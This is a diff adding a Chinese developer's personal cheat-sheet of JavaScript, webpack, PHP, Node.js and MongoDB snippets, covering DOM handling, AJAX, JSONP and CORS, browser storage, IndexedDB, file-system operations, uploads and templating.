@@ -1,0 +1,1683 @@
+// webpack作为服务器,发送信息
+before(app) {
+  const goodsData = require('./goods.json');
+  app.get('/goods', (req,res)=>{
+    return res.json( goodsData )
+  })
+//node.js跨域问题
+res.writeHead(200, {'Content-Type': 'text/plain','Access-Control-Allow-Origin':'*'});
+// webpack
+clean-webpack-plugin
+const { CleanWebpackPlugin } =require('clean-webpack-plugin')
+new CleanWebpackPlugin(),
+打包前清除全部数据
+// webpack-cli 的常用指令 
+(1) --mode: 指定模式 
+(2) --config: 指定一个webpack的配置文件 
+(3) --watch : 开始监听模式 
+(4) --hot: 开启模块热更新 
+(5) --progress: 显示打包进度
+(6) --profile: 详细输出每个环节的耗时，方便排查打包速度瓶颈  
+webpack提供了两个基本的loader来处理css
+1. css-loader : 识别css语法
+2. style-loader: 把样式内联到html中
+// CSS Module (模块化)
+css-loader 下设置 options: { modules : true }
+// CSS预处理的配置(less,sass,stylus)
+webpack 处理 less 文件， 需要 less-loader, sass文件需要sass-loader | node-sass
+// 独立打包css文件(mini-css-extract-plugin)
+目前为止，css 是被打包到JS中的，不利于CSS的调试，所以一般会吧CSS单独打包出来
+利用webpack提供的插件
+cnpm i -D mini-css-extract-plugin
+// url-loader
+打包图片的路径
+vue webpack打包静态资源路径错误,解决
+build/utils.js
+if (options.extract) {
+  return ExtractTextPlugin.extract({
+    use: loaders,
+    fallback: 'vue-style-loader',
+    publicPath:'../../'//重点
+  })
+}
+var a=document.getElementById('a')
+//改变css .style只能获得内联样式
+window.getComputedStyle(a).color
+a.style.background='red'
+a.style.background=''
+a.style.setProperty('background','green')
+a.style.removeProperty('background')//删除属性
+//如果css属性是字符串,用中括号框起来
+i.style[arguments[0]]='red'
+a.style[key]
+//改变属性
+a.getAttribute('color')
+a.hasAttribute('color')
+a.setAttribute('disabled','disabled')
+a.removeAttribute('disabled')
+//改变class
+a.classList.add()
+a.className+=' c2'
+a.className=''
+a.classList.remove('c2')
+//css选择器
+var a=document.querySelector('#app')
+var a=document.querySelectorAll('p')[0]
+//方法监听,使用id不需要先声明,区别在于可以同时添加多个方法,传统的方法,后一个会覆盖前面的方法
+a.addEventListener('click',f)
+a.removeEventListener('click',f)//移除
+a.onclick=function(){}
+a.onclick=null//移除方法
+//没有checked属性的input标签
+document.querySelector('td>input:not(:checked)')
+//字符串操作
+slice(1)//从第二个开始截取
+this.list.splice(i,1)//从i开始删除,删除1个
+this.list.push(car)
+this.list.unshift(car)//从末尾或者头部添加
+//验证码
+<h1 id="a">p2gmj6</h1>
+a.onclick=function(){
+      a.innerHTML=Math.random().toString(32).substr(2,6)
+    }
+//双色球
+var ball=[]
+  var i=0;
+  while(i<10){
+    ball[i]=parseInt(Math.random()*32+1)
+    i++
+  }
+  ball=[...new Set(ball)].slice(0,6).sort(function(a,b){return a-b})
+  console.log(ball)
+// 数组去重
+var arr = [10,30,15,10,20,15,30]
+document.write([...new Set(arr)])
+document.write('<br>')
+var a=[]
+for(i of arr){
+if(a.indexOf(i)==-1){
+  a.push(i)
+}
+}
+document.write(a)
+//元素当前下标,原生js
+var obj = document.querySelectorAll('#list li')
+for(i=0;i<obj.length;i++){
+obj[i].index=i
+obj[i].onclick=function (index) {
+  // this.style.display='none'
+  console.log(this.index)
+}
+}
+//arguments实参
+console.log(arguments)
+console.log(arguments[0])
+console.log(arguments.length)
+//形式参数
+console.log(arguments.callee)
+console.log(arguments.callee.length)
+//闭包,变量长期保存在内存中
+function f6 () {
+var num=10;
+return function () {
+  num++;
+  console.log(num)
+}
+}
+var aa=f6()
+aa()//11
+aa()//12
+//数组去重
+[...new Set(array)]
+//短路逻辑,三目
+return x>100?'above 100':'below 100'
+return x>100?(x>200?'above 200':'batween 100-200'):'balow 100'
+//逻辑运算,只看turn和false
+return (this.state.data || 'Fetching Data')
+//转换boolean
+!0;//ture
+//转string
+1+""
+//转number
++"15"
+//按位不运算
+~15=-16
+~~15=15
+//乘方
+3**2;//9
+//float转int,直接去掉小数点后的数
+23.9 | 0;
+//箭头函数,都是匿名函数
+x=>x**2
+function(x){
+return x**2;
+}
+()=>{}
+//数组截取
+a=[1,2,3,4,5,6,7,8]
+a.length=3;//a=[1,2,3]
+//对于中文的截取
+'吉'.at(0)  // '吉'
+//返回布尔值
+includes(), startsWith(), endsWith()
+//repeat函数
+'x'.repeat(3) // "xxx"
+//padStart()，padEnd()
+'1'.padStart(10, '0') // "0000000001"
+//forEach函数
+let obj = {a: 1, b: 2, c: 3}
+Object.values(obj).forEach(value=>console.log(value)) // 1, 2, 3
+const arr=[1,2,3,4,5]
+const nameArr=[]
+arr.forEach(item =>{
+  nameArr.push(item)
+})
+//[1,2,3,4,5]
+//map方法,必须写return
+const arr=[1,2,3,4,5]
+const g=arr.map(item =>{
+  return item+'...'
+})
+console.log(g)//["1...", "2...", "3...", "4...", "5..."]
+//表单oninput事件的运用
+<body>
+<form action="">
+    <textarea name="" id="artical" cols="30" rows="10"></textarea><br>
+    还可以输入<span id="mess">100</span>个字
+</form>
+<script>
+    artical.oninput=function () {
+        console.log(this.value.length)
+        mess.innerText=100-this.value.length
+    }
+</script>
+</body>
+(3)键盘事件
+a. onkeydown 键盘按下
+b. onkeyup 键盘弹起
+c. onkeypress 按下弹起
+(1)阻止事件冒泡,主流浏览器
+  a. event.stopPropagation();
+  阻止了事件冒泡，但不会阻击默认行为
+  b. return false;
+  阻止了事件冒泡，也阻止了默认行为
+  c. event.preventDefault(); 存在兼容问题
+  不阻击事件冒泡，但阻击默认行为
+//浏览器地址栏
+window.location.href="https://www.baidu.com"
+//浏览器前进后退
+window.history.forward()
+window.history.back()
+window.history.go(-2)
+//apache开启容许访问
+httpd.conf文件中
+allow from ...改为
+allow from all
+//php中文乱码,开头加
+header('Content-Type: text/html; charset=utf-8');
+//表格,无间距
+<table cellspacing="0" border="1px"></table>
+//axios发送ajax
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+axios.get("01.php?q="+str)
+    .then((res)=> {
+     console.log(res);
+      txtHint.innerHTML=res.data;
+    })
+    .catch((err)=> {
+      console.log(err);
+    });
+//post方法
+axios.post('/user', {
+      firstName: 'Fred',
+      lastName: 'Flintstone'
+    })
+    .then((res)=> {
+      console.log(res);
+    })
+    .catch((err)=> {
+      console.log(err);
+    });
+//php字符串长度strlen($name)
+php,get,post得到的信息$_GET,$_POST
+//in_array方法判断数组是否包含某个元素
+$arr=array('tom','mili','ming','abc');
+in_array($name,$arr)
+//重定向,方法一
+header('location:index.html');
+方法二
+echo "<script>window.location='index.html'</script>";
+//select 改变触发事件 onchange
+//原生js实现ajax
+//get
+xmlhttp=new XMLHttpRequest()
+  xmlhttp.open("GET","04.php?act=login&method=get",true)
+  xmlhttp.send()
+  xmlhttp.onreadystatechange=function () {
+      if (xmlhttp.readyState==4 && xmlhttp.status==200) {
+          getbox.innerHTML=xmlhttp.responseText
+      }
+  }
+//post
+xmlhttp=new XMLHttpRequest()
+  xmlhttp.open("POST","04.php?method=post",true)
+  xmlhttp.setRequestHeader('content-type','application/x-www-form-urlencoded');
+  xmlhttp.send('act=login&method=post')
+  xmlhttp.onreadystatechange=function () {
+      if (xmlhttp.readyState==4 && xmlhttp.status==200) {
+          postbox.innerHTML=xmlhttp.responseText
+      }
+  }
+//ajax,readystate状态编号0,1,2,3,4
+0请求未初始化
+1请求连接成功
+2请求正在发送
+3正在处理响应
+4处理完成
+//PHP判断post或者get
+$_SERVER['REQUEST_METHOD'] == 'GET'
+//php读取文件
+echo file_get_contents('a.xml')
+//axios获取xml
+axios.get("a.xml").then((res)=> {
+a=res.request.responseXML
+var students=a.querySelectorAll('students')
+for(i of students){
+for (j of i.children) {
+console.log(j.innerHTML)
+}}
+//express返回值
+end会乱码
+send不会乱码常用()
+render('index.html',{msg:msg})返回数据到指定页面
+//路由
+req.query: { id: '1' }
+req.body: [Object: null prototype] { name: 'bbb', content: 'cccccc' }
+req.params路由地址:后面的参数,返回一个对象
+app.use匹配某个路径下所有路径
+app.all既有post又有get
+//jquery的ajax
+$("button").click(function(){
+    $.post("01.php?id=1",{name:'jack'},function(data,status,xhr){
+        console.log(xhr)
+        box.innerText="数据: " + data + "\n状态: " + status
+    });
+  $.ajax({
+    url:'01.php',
+    type:'get',
+    datatype: 'text',
+    success:function (data,status) {
+      box.innerText="数据: " + data + "\n状态: " + status
+      console.log('success')
+    },
+    beforeSend:function () {
+      console.log('beforeSend')
+    }
+  })
+});
+//jsonp跨域
+<?php
+echo $_GET['callback'].'()';
+?>
+<script>
+ function jsonp() {
+        console.log('jsonp')
+    }
+</script>     
+<script src="http://127.0.0.1/02.php?callback=jsonp"></script>
+//PHP的cors
+header('Access-Control-Allow-Origin: *');
+//flask的cors
+from flask_cors import CORS
+CORS(app, supports_credentials=True)
+//jQ跨域,jsonp,第二种方法
+$.get("http://127.0.0.1/02.php",function(data,status){
+    console.log(data)
+},'jsonp');
+//第二种方法,getJSON,jsonp的缺点:只支持get方式,http请求,没有错误处理机制
+$.getJSON("http://127.0.0.1/02.php?callback=?",function(data,status){
+          console.log(data)
+    });
+echo $_GET['callback']."(21321321)"
+// 浏览器窗口高度,滚动监听
+var h = window.innerHeight || document.body.clientHeight
+document.body.onscroll=function () {
+// 滚动条距离顶部的距离 > (总高度-窗口高度)*0.8
+  if(document.documentElement.scrollTop>(document.documentElement.scrollHeight-window.innerHeight)*0.8){
+    getData()
+  }
+}
+//打乱数组
+var arr=[];
+for(var i=0;i<100;i++){
+      arr[i]=i;
+  }
+arr.sort(function(){ return 0.5 - Math.random() })
+var str=arr.join();
+console.log(arr)
+//canvas
+lineJoin圆形边角                        
+function draw() {
+    var ctx = document.getElementById('canvas').getContext('2d');
+    ctx.font = "bold 48px 宋体";
+    // 水平居中
+    ctx.textAlign = "center";
+    ctx.fillStyle = 'red'
+    // 垂直居中
+    ctx.textBaseline = 'middle'
+    // 阴影
+    ctx.shadowOffsetX = 2;
+    ctx.shadowOffsetY = 2;
+    // 模糊程度
+    ctx.shadowBlur = 2;
+    ctx.shadowColor = "rgba(0, 0, 0, 0.5)";
+    ctx.fillText("Hello World", 250, 250);
+    ctx.strokeText("Hello World", 250, 100);
+    ctx.beginPath();
+    //绘制圆
+    ctx.arc(50, 50, 30, 0, Math.PI * 2, true);
+    ctx.arc(50, 50, 15, 0, Math.PI * 2, true);
+    ctx.fill("evenodd");//evenodd参数用于绘制空心的圆环
+}                        
+//绘制图片
+function draw() {
+    var ctx = document.getElementById('canvas').getContext('2d');
+    var img = new Image();
+    img.onload = function(){
+      ctx.drawImage(img,0,0);
+    }
+    img.src = 'timg.jpg';
+//设置重叠
+ctx.globalCompositeOperation='lighter';
+//jq格式的方法,把函数
+!function (a,b) {
+    console.log(a+b)
+}(1,2)
+解决 react onClick 方法自动执行     
+<a href="#" onClick={this.onLoadQR.bind(this, text)}><Icon type="qrcode" />下载</a>
+<a href="#" onClick={()=>this.onLoadQR(text)}><Icon type="qrcode" />下载</a>
+//php操作cookie
+setCookie()
+//原生js操作cookie
+var myCookie={
+    set:function (key,value,days) {
+        document.cookie = key+"="+value+';path=/;Max-Age='+days*24*3600;
+        console.log('设置成功')
+    },
+    get:function (key) {
+        var a=document.cookie.indexOf(key)
+        var b=document.cookie.indexOf(';',a)
+        if(b==-1){
+            console.log(document.cookie.slice(a+key.length+1))
+        }else{
+            console.log(document.cookie.slice(a+key.length+1,b))
+        }
+    }
+}
+//localstorage
+localStorage.setItem(key,value)
+localStorage.getItem(key)
+localStorage.removeItem(key)
+localStorage.clear()
+获取指定的key
+localStorage.key(0)
+localStorage.key('cmts')
+localStorage.valueOf(0)
+localStorage.valueOf('cmts')
+存数组或者json格式
+localStorage.setItem('ming',JSON.stringify(ming));
+//js判断一个东西的类型
+arr=[]
+Object.prototype.toString.call(arr)
+"[object Array]"
+//sessionStorage数组保存在内存中
+cookie 和session 的区别：
+1、cookie数据存放在客户的浏览器上，session数据放在服务器上。
+2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗
+   考虑到安全应当使用session。
+3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能
+   考虑到减轻服务器性能方面，应当使用COOKIE。
+4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。
+5、所以个人建议：
+   将登陆信息等重要信息存放为SESSION
+   其他信息如果需要保留，可以放在COOKIE中
+// 新建indexedDB
+var request = window.indexedDB.open('db');
+// 三大事件    
+request.onupgradeneeded = function(event) {
+  db = event.target.result;
+  var objectStore = db.createObjectStore('person', { keyPath: 'id',
+      autoIncrement: true });
+  //指定可以被索引的字段，unique字段是否唯一
+  objectStore.createIndex('name', 'name', { unique: false });
+  objectStore.createIndex('email', 'email', { unique: true });
+}
+// request.result==event.target.result
+request.onsuccess = function (event) {
+  db = request.result;
+  console.log('数据库打开成功');
+  console.log(event)
+  console.log(request)
+  console.log(event.target.result)
+};
+request.onerror = function (event) {
+  console.log('数据库打开报错');
+};
+//关闭
+close()
+//删除数据库
+window.indexedDB.deleteDatabase('db')
+//增加数据
+var db = window.indexedDB.open('db');
+window.onload=function (){
+var request = db.result.transaction('stu1', 'readwrite')
+.objectStore('stu1')
+.add({ id: 3, name: '李四', email: 'zhangsan@example' })
+}
+//修改数据
+var db = window.indexedDB.open('db');
+window.onload = function add() {
+    var transaction = db.result.transaction('stu1', 'readwrite')
+    var obj = transaction.objectStore('stu1')
+    var request = obj.get(3)
+    request.onsuccess = function (e) {
+        obj.put({id: 3, name: '李', email: 'zhangsan'})
+        db.result.close()
+        console.log('数据修改成功');
+    };
+    request.onerror = function (event) {
+        console.log('数据修改失败');
+        db.result.close()
+    }
+}
+//删除数据
+var db = window.indexedDB.open('db');
+window.onload = function add() {
+    var transaction = db.result.transaction('stu1', 'readwrite')
+    var obj = transaction.objectStore('stu1')
+    var request = obj.delete(3)
+    request.onsuccess = function (e) {
+        db.result.close()
+        console.log('数据删除成功');
+    };
+    request.onerror = function (event) {
+        console.log('数据删除失败');
+        db.result.close()
+    }
+}
+//查询数据
+var db = window.indexedDB.open('db');
+window.onload = function add() {
+    var transaction = db.result.transaction('stu1', 'readwrite')
+    var obj = transaction.objectStore('stu1')
+    var request = obj.get(2)
+    request.onsuccess = function (e) {
+        console.log(request)
+        db.result.close()
+        console.log('获取成功');
+    };
+    request.onerror = function (event) {
+        console.log('数据获取失败');
+        db.result.close()
+    }
+}
+//React不对html标签转义
+dangerouslySetInnerHTML={{__html: item}}
+//用对象定义正则
+var re = new RegExp(i,"g")
+/我去/g
+//将下列字符串每个单词的首字母转成大写,然后输出!
+var str ="no zuo no die no can no bibi";
+str.replace(/( |^)[a-z]/g, (L) => L.toUpperCase());
+//react-transition-group
+<CSSTransition
+in={this.state.show}
+timeout={1000}
+classNames="fade"
+//可以挂载js函数
+onEntered={(el) => { el.style.color = 'blue'; }}
+//设置在打开页面时就显示动画
+appear
+>
+报错：Expected linebreaks to be 'LF' but found 'CRLF'  linebreak-style
+原因：windows下的换行规则，在项目.eslintrc文件的，rules中添加
+"linebreak-style": [0,"error", "windows"],
+//redux-thunk
+本来的store只能传对象近去
+可以传入异步的方法,输出对象
+只是简单的升级action
+//redux-saga
+可以把异步的方法都放在一个saga文件中处理
+适用于大型的项目,Api丰富
+//vue去掉路由中的#
+mode: 'history'
+//前端优化
+静态资源是最大的瓶颈(html,css,js,图片)
+优化:1.使用字体图标
+2.base64图片
+3.雪碧图
+4.css,js合并
+5.懒加载
+//类数组转为数组
+function f() {
+  var arr=[].slice.call(arguments)
+  console.log(arguments)
+  console.log(arr)
+}
+f(1,2,3,4,5)
+//深拷贝方法
+function cloneDeep(obj){
+      var newObj=obj instanceof Array ? [] : {};
+      //遍历obj
+      for(var key in obj){
+            newObj[key] = typeof obj[key]=='object' ? 
+            cloneDeep(obj[key]) : obj[key];
+      }
+       return newObj;
+};
+//react的html转义
+dangerouslySetInnerHTML={{__html: this.props.content}}
+//移除滚动监听
+window.addEventListener('scroll', this.props.changeScroll);
+window.removeEventListener('scroll', this.props.changeScroll);
+//取消上一次的ajax请求
+ if(ajax){
+   ajax.abort();
+}
+//vue双向绑定原理defineProperty
+let car = {}
+let val = 3000
+Object.defineProperty(car, 'price', {
+    get(){
+        console.log('price属性被读取了')
+        return val
+    },
+    set(newVal){
+        console.log('price属性被修改了')
+        val = newVal
+    }
+})
+//cnpm安装
+npm install -g cnpm --registry=https://registry.npm.taobao.org
+//node创建文件夹
+var fs = require("fs");
+fs.mkdir('./a',function (err) {
+    err&&console.log(err)
+})
+//node追加文本内容
+fs.appendFile('./b.txt','asdasdasd',function (err) {
+    console.log(err)
+})
+//node删除文件
+fs.unlink('1.txt',err=>console.log(err))
+//node读取文件夹
+fs.readdir('./a',function (err,files) {
+    console.log(files)
+})
+[ '新建文本文档 - 副本 (2).txt', '新建文本文档 - 副本.txt', '新建文本文档.txt' ]
+//判断是文件夹还是文件
+fs.readdir('./',{withFileTypes:true},function (err,files) {
+    console.log(files)
+    console.log(files[0].isDirectory())
+})
+两个搭配使用{withFileTypes:true},files[0].isDirectory()
+//删除文件夹
+fs.rmdir('./a',function (err) {
+    console.log(err)
+})
+//node判断文件夹或者文件
+fs.stat('./a',function (err,stats) {
+    console.log(stats)
+    console.log(stats.isDirectory())
+    console.log(stats.isFile())
+})
+//判断一个文件夹所有文件是不是文件夹,需要用到statSync同步方法
+//方法一,同步方法
+fs.readdir('./',function (err,files) {
+    console.log(files)
+    for(i of files){
+        fs.statSync(i).isDirectory()?console.log(i,'是文件夹'):console.log(i,'是文件')
+    }
+})
+//方法二,使用let
+fs.readdir('./',function (err,files) {
+    console.log(files)
+    for(let i of files){
+        fs.stat(i,function (err,stats) {
+        stats.isDirectory()?console.log(i,'是文件夹'):console.log(i,'是文件')
+    })
+    }
+})
+//方法三,递归
+fs.readdir('./',function (err,files) {
+    console.log(files)
+    const len=files.length;
+    (function a(i) {
+    if(i==len)return;
+    fs.stat(files[i],function (err,stats) {
+        console.log(i)
+        stats.isDirectory()?console.log(files[i],'是文件夹'):console.log(files[i],'是文件')
+         a(++i)
+    })
+})(0)
+})
+//node递归删除非空文件夹
+function deleteFolderRecursive(path) {
+    if( fs.existsSync(path) ) {
+        fs.readdirSync(path).forEach(function(file) {
+            var curPath = path + "/" + file;
+            if(fs.statSync(curPath).isDirectory()) { // recurse
+                deleteFolderRecursive(curPath);
+            } else { // delete file
+                fs.unlinkSync(curPath);
+            }
+        });
+        fs.rmdirSync(path);
+    }
+};
+//express三种返回方法
+res.end可能会乱码
+res.send自动识别编码(推荐)
+res.render配合模板使用
+//原生node中文乱码
+res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
+//时间模块silly-datetime
+var sd = require('silly-datetime');
+const now=new Date();
+sd.locate('zh-cn')
+console.log(sd.format())
+console.log(sd.format(now))
+console.log(sd.fromNow(now.getTime()+10000000))
+//node上传文件formidable
+var formidable = require('formidable'),
+    http = require('http'),
+    fs = require('fs'),
+    util = require('util');
+http.createServer(function(req, res) {
+  if (req.url == '/upload' && req.method.toLowerCase() == 'post') {
+    // parse a file upload
+    var form = new formidable.IncomingForm();
+    // 用于windows跨盘符,不写不能跨盘符
+        form.uploadDir='./'
+    form.parse(req, function(err, fields, files) {
+      res.writeHead(200, {'content-type': 'text/plain'});
+      res.write('received upload:\n\n');
+      res.end(util.inspect({fields: fields, files: files}));
+      console.log(fields)
+      console.log(files)
+        const oldPath=files.upload.path
+        //'uploads\\upload_eaf3aae723a63fa69532ded31e6dd10f'
+        const name=files.upload.name
+        //微信截图_20190328145925
+        fs.rename(oldPath,name,function (err) {
+            console.log(err)
+        })
+    });
+    return;
+  }
+  // show a file upload form
+  res.writeHead(200, {'content-type': 'text/html'});
+  res.end(
+    '<form action="/upload" enctype="multipart/form-data" method="post">'+
+    '<input type="text" name="title"><br>'+
+    '<input type="file" name="upload" multiple="multiple"><br>'+
+    '<input type="submit" value="Upload">'+
+    '</form>'
+  );
+}).listen(8080);
+//模板引擎ejs
+const ejs=require('ejs');
+const data='ejs';
+const template='这是一个<%=temp %>的{{temp}}模板';
+const res=ejs.render(template,{temp:data});
+console.log(res);
+//
+const http = require('http');
+const fs = require('fs');
+const ejs=require('ejs');
+http.createServer(function (req, res) {
+    res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
+    // res.writeHead("text/html; charset=utf-8")
+    // 发送响应数据 "Hello World"
+    const temp='ejs';
+    const time=(new Date()).toLocaleString();
+    const arr=['苹果','香蕉','草莓'];
+    fs.readFile('./index.html',function (err,data) {
+        const result=ejs.render(data.toString(),{temp,time,arr});
+        console.log(result)
+        res.end(result)
+    })
+}).listen(5000);
+//
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <style>
+        li{
+            color: red;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+<h1>这是一个<%=temp %>的模板</h1>
+<h2>现在时间是<%=time %></h2>
+<ul> <% arr.forEach(function(item){%>
+        <li><%=item %></li>
+    <% }) %></ul>
+</body>
+</html>
+//express获取参数有三种方法：官网实例： 
+Checks route params (req.params.id), ex: /user/:id
+{ id: '1003' }
+Checks query string params (req.query), ex: ?id=12 
+Checks urlencoded body params (req.body), ex: id=
+//console.dir()可以显示一个对象的所有属性和方法
+//一旦数据用不到了,就把值设置为null释放内存
+//web在线聊天,qq
+类似QQ的聊天软件，这类技术说起来很简单，其实很复杂，如果不用第三方的组件，自己实现的话是需要花点心思的
+无论通过何种方式，究其本质无外乎这么几种方式：
+1）客户端定时轮询：客户端程序通过定时方式向服务器查询数据，接收到反馈后更新客户端界面，这种方式对服务器的压力随用户数的增加而增加，且消息传递不及时
+2）服务器通知：所有客户端都连接到服务器，所有的消息都发送到服务器，服务器根据不同的目的地进行消息投递，客户端程序只要接收服务器的数据并作出相应即可，这种方式消息传递较上一种方式及时，但客户端的通讯都通过服务器中转，服务器的压力较大
+3）点对点方式：客户端连接服务器，从服务器上得到其他客户端的通讯方式，然后绕过服务器直接把消息发送到其他客户端，服务器的作用只是对所有的连接进行必要的管理，负荷较轻，且消息传递及时性好，但这种方式需要考虑客户端防火墙的反向穿透问题
+如果采用2、3种方式，由于涉及winsock通讯，需要安装客户端程序或者浏览器插件，常见的简单网页聊天室都是第1种方式
+//浏览器刷新
+location.reload();
+//检测数组
+a instanceof Array
+Array.isArray(a)
+Object.prototype.toString.call(a)//"[object Array]"
+//数组的一些方法
+every()：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。
+filter()：对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。
+forEach()：对数组中的每一项运行给定函数。这个方法没有返回值。
+map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。
+some()：对数组中的每一项运行给定函数，如果该函数有一项返回 true，则返回 true。
+以上方法都不会修改数组中的包含的值。
+//replace高级应用
+function htmlEscape(text) {
+    return text.replace(/[<>"&]/g, function (match, pos, originalText) {
+        switch (match) {
+            case "<":
+                return "&lt;";
+            case ">":
+                return "&gt;";
+            case "&":
+                return "&amp;";
+            case "\"":
+                return "&quot;";
+        }
+    });
+}
+console.log(htmlEscape("<p class=\"greeting\">Hello world!</p>"))
+&lt;p class=&quot;greeting&quot;&gt;Hello world!&lt;/p&gt;
+//split高级应用
+var colorText = "red,blue,green,yellow"; 
+var colors1 = colorText.split(","); //["red", "blue", "green", "yellow"] 
+var colors2 = colorText.split(",", 2); //["red", "blue"] 
+var colors3 = colorText.split(/[^\,]+/); //["", ",", ",", ",", ""]
+//Object.defineProperty高级功能,数据属性
+var person={}
+Object.defineProperty(person,'name',{
+    //四大属性,默认值都是true
+    Configurable:true,//能否删除,修改
+    Enumerable:true,//能否通过for-in遍历属性
+    writable: true,//能否修改它
+    value:'nick'//默认undefined
+})
+console.log(person.name)
+person.name='tom'
+console.log(person.name)
+//访问器属性,有Configurable,Enumerable,get,set
+var book={
+    _year:2004,
+    edition:1
+};
+Object.defineProperty(book,'year',{
+    get:function () {
+        return this._year
+    },
+    set:function (newValue) {
+        if(newValue>2004){
+            this._year=newValue;
+            this.edition+=newValue-2004
+        }
+    }
+});
+book.year=2005;
+console.log(book.edition) //2
+var desc=Object.getOwnPropertyDescriptor(book,'_year')
+console.log(desc)//{value: 2004, writable: true, enumerable: true, configurable: true}
+var desc=Object.getOwnPropertyDescriptor(book,'year')
+//{get: ƒ, set: ƒ, enumerable: false, configurable: false}        
+//创建对象的7中方法
+1.工厂模式
+function Person(name,age) {
+    var o=new Object();
+    o.name=name;
+    o.age=age;
+    o.sayName=function () {
+        console.log(this.name)
+    }
+    return o
+}
+var a=Person('tom',15)
+2.构造函数
+function Person(name,age) {
+    this.name=name;
+    this.age=age;
+    this.sayName=function () {
+        console.log(this.name)
+    }
+}
+var a=new Person('tom',15)
+3.原型模式
+function Person(name,age) {}
+Person.prototype.name='tom';
+Person.prototype.age=25;
+Person.prototype.sayName=function () {
+    console.log(this.name)
+};
+var a=new Person();
+a.sayName();//tom
+4.组合使用构造函数和原型模式
+function Person(name,age) {
+    this.name=name;
+    this.age=age;
+}
+Person.prototype={
+    constructor:Person,
+    sayName:function () {
+        console.log(this.name);
+    }
+}
+//mongodb,node
+mongod --dbpath D:\mongodb
+查询
+db.site.find()
+插入
+db.site.insert({id:104,name:'lily',age:14,gender:'F'})
+删除db.site.remove({'id':104})
+修改db.site.update({id:102},{$set:{'name':'tom'}})
+修改多个db.site.update({name:'tom'},{$set:{age:40}},{multi:true})
+//导入文件到mongo
+C:\Users\Administrator>mongoimport -d runoob -c site C:\data\1.json
+{"name":"aaa","age":23,"likes":["吃饭","逛街"],"score":{"html":"80","css":"85","js":"68"}}
+{"name":"bbb","age":43,"likes":["游泳","游戏"],"score":{"html":"60","css":"90","js":"90"}}
+{"name":"ccc","age":33,"likes":["写代码","直播"],"score":{"html":"70","css":"79","js":"32"}}
+//删除数据库
+db.dropDatabase()
+//条件操作,大于是$gt
+db.site.find({age:{$gt:30}})
+//window.open打开一个新窗口
+window.open("http://www.wrox.com/","wroxWindow","height=400,width=400,top=10,left=10,resizable=yes");
+//关闭窗口
+window.close()
+//打开,写入,移动,聚焦,改变大小
+myWindow=window.open('','','width=200,height=100');
+myWindow.document.write("<p>这是我的窗口</p>");
+myWindow.moveTo(0,0);
+myWindow.focus();
+myWindow.resizeTo(500,500)
+//类数组:childNodes,arguments
+//类数组转为数组Array.from(arguments)
+a=document.querySelector('body')
+Array.prototype.slice.call(a.childNodes)
+//浏览器支持给定名称和版本的功能
+document.implementation.hasFeature('XML','1.0')
+document.URL//"http://172.17.14.250:8080/computer"
+document.domain
+"172.17.14.250"
+document.referrer
+"http://172.17.14.250:8080/computer"
+document.forms
+HTMLCollection [form#[object HTMLInputElement]]
+document.links
+HTMLCollection(8) [a, a, a, a, a, a, a, a]
+//mongodb最大连接数
+db.serverStatus().connections
+//格式化时间
+(new Date("2019-05-31T05:30:49.000Z")).toLocaleString()
+//div可编辑
+<div id="move" contentEditable>可编辑</div>
+//jq输出序列化表单值的结果
+$("button").click(function(){
+  $("div").text($("form").serialize());
+});
+//创建css元素
+var style=document.createElement('style')
+style.appendChild(document.createTextNode('body{background:red}'))
+document.head.appendChild(style)
+//后端模板引擎在js中使用
+var aa=JSON.parse('{{msgs}}'.replace(/&#34;/g,'\"'))
+//时间捕获阶段触发事件,设置第三个参数为true
+d1.addEventListener('click',function(){
+	console.log(this.innerHTML)
+},true)
+//浏览器兼容问题
+addEventListener,removeEventListener
+attachEvent, detachEvent
+getComputedStyle, currentStyle
+stopPropagation,window.event.cancelBubble=true
+preventDefault(),window.event.returnValue=false
+鼠标事件event.shiftKey,ctrlKey,altKey,metaKey
+有没有在点击鼠标的时候按shift键
+//鼠标滚动事件
+d3.onmousewheel=function () {
+   console.log(event)
+}
+//onpageshow事件,在onload事件之后
+window.onpageshow=function () {
+    alert(123)
+}
+//ondeviceorientation,移动设备的翻转事件
+window.ondeviceorientation = function () {
+    console.log("Alpha=" + event.alpha + ", Beta=" + event.beta +
+        ", Gamma=" + event.gamma + "<br>")
+}
+//表单的select方法
+d1.onfocus=function () {
+    this.select()
+}//input元素获得焦点时,全选里面的内容
+//鼠标选择input中的内容时触发
+d1.onselect=function () {
+    console.log(123)
+}
+<input type="text" value="123456" id="d1">
+d1.setSelectionRange(0,3)
+//pattern属性,要求只输入数字
+<input type="text" pattern="\d+">
+//每个表单都有这个方法,检查输入是否符合pattern,required等规范,也可以对form使用这个方法
+input.checkValidity()
+input.validity检查有效性,返回一个对象
+ValidityState {badInput: false
+customError: false
+patternMismatch: true
+rangeOverflow: false
+rangeUnderflow: false
+stepMismatch: false
+tooLong: false
+tooShort: false
+typeMismatch: false
+valid: false
+valueMissing: false
+__proto__: ValidityState}
+//禁用表单验证novalidate
+<form action="" novalidate></form>
+给submit按钮的是formnovalidate
+//node原生crypto加密
+const crypto = require('crypto');
+const secret = '123';
+const hash = crypto.createHash('md5').update(secret).digest('base64');
+console.log(hash);//ICy5YqxZB1uWSwcVLSNLcA==
+//js添加select的option选项
+var n=new Option('nanjin','nanjin');
+loca.appendChild(n)//或者
+loca.add(n,undefined)//浏览器兼容性
+loca.removeChild(loca.options[0])//移除第一个option
+loca.remove(0)
+loca.options[0]=null
+loca.insertBefore(loca.options[1],loca.options[loca.options[1].index+2])//把option选项后移一位
+//页面可编辑,富文本
+<iframe src="./post.html" frameborder="0" name="aa"></iframe>
+frames['aa'].document.designMode='on'
+frames.document.designMode='on'
+document.designMode='off'
+//编辑富文本
+document.execCommand('formatblock',false,'<h1>')
+document.queryCommandEnabled('bold')//检查能否使用bold命令
+document.queryCommandValue('formatblock')//"h1",获取值
+document.getSelection()//获取选中的内容
